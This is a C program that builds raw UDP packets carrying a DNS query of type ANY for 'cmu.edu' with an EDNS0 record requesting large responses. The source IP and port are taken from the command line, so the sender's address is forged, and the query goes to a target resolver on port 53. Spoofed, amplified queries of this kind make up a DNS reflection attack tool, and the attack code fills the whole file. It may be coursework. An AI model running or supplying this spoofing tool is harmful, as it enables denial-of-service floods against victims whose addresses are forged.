// Must be run by root lol! Just datagram, no payload/data

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <netinet/udp.h>
#include "dns.h"
#define PCKT_LEN 8192

void error(char *str){
	printf("%s\n", str);
}

// total udp header length: 8 bytes (=64 bits)
// Function for checksum calculation. From the RFC,
// the checksum algorithm is:
//  "The checksum field is the 16 bit one's complement of the one's
//  complement sum of all 16 bit words in the header.  For purposes of
//  computing the checksum, the value of the checksum field is zero."
// Taken from http://www.binarytides.com/raw-udp-sockets-c-linux/


unsigned short csum(unsigned short *ptr, int nbytes){
	register long sum;
	unsigned short oddbyte;
	register short answer;
	sum = 0;
	while (nbytes > 1) {
		sum += *ptr++;
		nbytes -= 2;
	}
	if (nbytes == 1) {
		oddbyte = 0;
		*((unsigned char *)&oddbyte) = *(unsigned char *)ptr;
		sum += oddbyte;
	}
	sum = (sum >> 16) + (sum & 0xffff);
	sum = sum + (sum >> 16);
	answer = (short)~sum;
	return(answer);
}

void dns_format(unsigned char * dns,const unsigned char * host){
	int lock = 0 , i;
	strcat((char*)host,".");
	for(i = 0 ; i < strlen((char*)host) ; i++) {
		if(host[i]=='.'){
			*dns++ = i-lock;
			for(;lock<i;lock++){
				*dns++=host[lock];
			}
			lock++;
		}
	}
	*dns++=0x00;
}

void dns_hdr_create(dns_hdr *dns){
	dns->id = (unsigned short)htons(25366); //dns->id = (unsigned short)htons(getpid());
	dns->flags = htons(0x0100);
	dns->qcount = htons(1);
	dns->ans = 0;
	dns->auth = 0;
	dns->add = htons(1);
}

// Source IP, source port, target IP, target port from the command line arguments

int main(int argc, char *argv[]){
    char datagram[PCKT_LEN], *data, *psgram;	
	const unsigned char dns_site[32] = "cmu.edu";
	unsigned char *dns_name, dns_rcrd[32];
	int one = 1;
	const int *val = &one;
	memset(datagram, 0, PCKT_LEN);

    // Our own headers' structures
    struct iphdr *ip = (struct iphdr *) datagram;
	struct udphdr *udp = (struct udphdr *) (datagram + sizeof(struct iphdr));
	dns_hdr *dns = (dns_hdr *) (datagram + sizeof(struct iphdr) + sizeof(struct udphdr));
    dns_name = (unsigned char *) (datagram + sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(dns_hdr));
	dns_format(dns_name , dns_site);
	query *q = (query *) (datagram + sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(dns_hdr) + strlen(dns_name) + 1);
	struct dnsadditional *dnsa = (struct dnsadditional * ) (datagram + sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(dns_hdr) + strlen(dns_name) + 2 + sizeof(query));

    //data = datagram + sizeof(struct iphdr) + sizeof(struct udphdr);
	//memcpy(data, &dns_data, sizeof(dns_hdr)+strlen(dns_name)+sizeof(query) + 1);
    struct sockaddr_in sin, din;
	if(argc != 4){
		printf("- Invalid parameters!!!\n");
		printf("- Usage %s <source hostname/IP> <source port> <target hostname/IP>\n", argv[0]);
		exit(-1);
	}
	
	// Create a raw socket with UDP protocol
   	int sd = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);
	if(sd < 0){
		perror("socket() error");
		exit(-1);
	}
	else{
		printf("socket() - Using SOCK_RAW socket and UDP protocol is OK.\n");
	}
	sin.sin_family = AF_INET;
	din.sin_family = AF_INET;
	sin.sin_addr.s_addr = inet_addr(argv[1]);
	sin.sin_port = htons(atoi(argv[2]));
	din.sin_addr.s_addr = inet_addr(argv[3]);
	din.sin_port = htons(53); //din.sin_port = htons(atoi(argv[4]));

    // Fabricate the IP header or we can use the
    // standard header structures but assign our own values.
	ip->ihl = 5;
	ip->version = 4;
	ip->tos = 16; // Low delay
	ip->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(dns_hdr) + strlen(dns_name) + 2 + sizeof(query) + sizeof(struct dnsadditional);//
	ip->id = htonl(getpid());
	ip->frag_off = htons(0x4000);
	ip->ttl = 64; // hops
	ip->protocol = 17; // UDP
	ip->saddr = inet_addr(argv[1]);
	ip->daddr = inet_addr(argv[3]);
	ip->check = csum((unsigned short *)datagram, ip->tot_len);
	
	// Fabricate the UDP header. Source port number, redundant
	udp->source = htons(atoi(argv[2]));
	udp->dest = htons(53);//udp->dest = htons(atoi(argv[4]));
	udp->len = htons(sizeof(struct udphdr) + sizeof(dns_hdr) + strlen(dns_name) + sizeof(query) + 2 + sizeof(struct dnsadditional));//
	udp->check = 0;

    // DNS
	dns_hdr_create(dns);
	q->qtype = htons(0x00ff);/////******************************************revise here******************/////
	q->qclass = htons(0x1);
	dnsa->dnsa_type = htons(41);
	dnsa->dnsa_udppayloadsize = htons(0x1000);

    // Calculate the checksum for integrity
	// Inform the kernel do not fill up the packet structure. we will build our own...
    if(setsockopt(sd, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0){
		perror("setsockopt() error");
		exit(-1);
	}
	else{
		printf("setsockopt() is OK.\n");
	}

	// Send loop, send for every 2 second for 100 count

	printf("Trying...\n");
	printf("Using raw socket and UDP protocol\n");
	printf("Using Source IP: %s port: %u, Target IP: %s port: %u.\n", argv[1], atoi(argv[2]), argv[3], atoi("53"));

	int count;
	for(count = 1; count <= 3; count++){
		if(sendto(sd, datagram, ip->tot_len, 0, (struct sockaddr *)&din, sizeof(din)) < 0){
			// Verify
			perror("sendto() error");
			exit(-1);
		}
		else{
			printf("Count #%u - sendto() is OK.\n", count);
			sleep(2);
        }
    }

    close(sd);
    return 0;
}
